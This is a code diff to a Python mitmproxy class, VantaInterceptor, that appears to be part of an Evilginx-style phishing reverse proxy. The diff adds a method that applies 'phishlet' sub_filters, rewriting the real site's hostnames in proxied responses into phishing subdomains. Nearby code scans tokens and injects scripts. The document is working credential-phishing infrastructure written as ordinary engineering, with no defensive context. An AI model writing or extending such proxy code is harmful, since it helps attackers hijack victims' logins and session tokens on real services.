@@ -404,6 +404,9 @@ class VantaInterceptor:
         except Exception:
             pass
 
+        # 2e. Apply sub_filters (Mirroring)
+        self._apply_sub_filters(flow)
+
         # 3. Inject Content
         if flow.response.content:
             self._inject_scripts(flow)
@@ -490,6 +493,91 @@ class VantaInterceptor:
                         
         except Exception as e:
             self.logger.error(f"Error scanning tokens: {e}")
+
+    def _apply_sub_filters(self, flow: http.HTTPFlow):
+        """Apply string replacements on response body based on sub_filters"""
+        try:
+            if not flow.response.content: return
+            
+            content_type = flow.response.headers.get("content-type", "")
+            ph_host = getattr(flow, "metadata", {}).get("v_ph_host")
+            
+            # Determine base domain (e.g., example.com) from ph_host (e.g., sub.example.com)
+            # This is tricky without tldextract, so we rely on heuristic:
+            # Assume 2 levels TLD (co.uk) or 1 level (com).
+            # For now, we assume standard 1 level or just split by dot.
+            # BUT, we can use the phishlet config if available, or just split.
+            # A better way: The phishlet loader knows the base domain.
+            # But we don't have access to it here easily.
+            # Let's try to extract it from the request host if possible.
+            if not ph_host: return
+
+            parts = ph_host.split('.')
+            if len(parts) >= 2:
+                base_domain = ".".join(parts[-2:]) # simplistic
+                # If we have a known subdomain from proxy_hosts, we can subtract it.
+                # Find which proxy_host matches ph_host
+                for ph in self.phishlet.proxy_hosts:
+                    if ph_host.startswith(ph.phish_sub + "."):
+                        base_domain = ph_host[len(ph.phish_sub)+1:]
+                        break
+            else:
+                base_domain = ph_host # localhost?
+
+            for f in getattr(self.phishlet, "sub_filters", []):
+                # Check mime
+                mime_match = False
+                for m in f.mimes:
+                    if m in content_type:
+                        mime_match = True
+                        break
+                if not mime_match: continue
+                
+                # Check triggers_on (target hostname)
+                # We should apply if the current response is from the target host
+                # OR if we just want to replace occurrences globally in any response.
+                # Evilginx usually applies globally if triggers_on matches the current request host?
+                # Actually, Evilginx applies filters on responses from specific hosts.
+                # But here, we can just apply globally for simplicity, or check v_tgt_host.
+                tgt_host = getattr(flow, "metadata", {}).get("v_tgt_host")
+                if tgt_host and f.triggers_on not in tgt_host:
+                     # Only skip if strict matching is required.
+                     # But often we want to replace links to OTHER hosts in THIS response.
+                     # So we should NOT skip.
+                     pass
+
+                # Prepare replacement
+                # We need to find the phish_sub for the domain in the filter
+                # The filter has orig_sub and domain.
+                # We look for a proxy_host with same orig_sub and domain.
+                phish_sub = None
+                for ph in self.phishlet.proxy_hosts:
+                    if ph.orig_sub == f.orig_sub and ph.domain == f.domain:
+                        phish_sub = ph.phish_sub
+                        break
+                
+                if not phish_sub: continue
+                
+                phish_hostname = f"{phish_sub}.{base_domain}"
+                target_hostname = f"{f.orig_sub}.{f.domain}"
+                
+                search_str = f.search.replace("{hostname}", target_hostname).replace("{domain}", f.domain)
+                replace_str = f.replace.replace("{hostname}", phish_hostname).replace("{domain}", base_domain)
+                
+                # Apply
+                try:
+                    # Use regex if search_str looks like regex?
+                    # Evilginx uses string replacement usually.
+                    # But Python's replace is literal.
+                    # Let's try literal first.
+                    if search_str in flow.response.text:
+                        flow.response.text = flow.response.text.replace(search_str, replace_str)
+                        self.logger.debug(f"Applied filter: {search_str} -> {replace_str}")
+                except Exception:
+                    pass
+                    
+        except Exception as e:
+            self.logger.error(f"Error applying sub_filters: {e}")
 
     def _inject_scripts(self, flow: http.HTTPFlow):
         if "text/html" in flow.response.headers.get("content-type", ""):
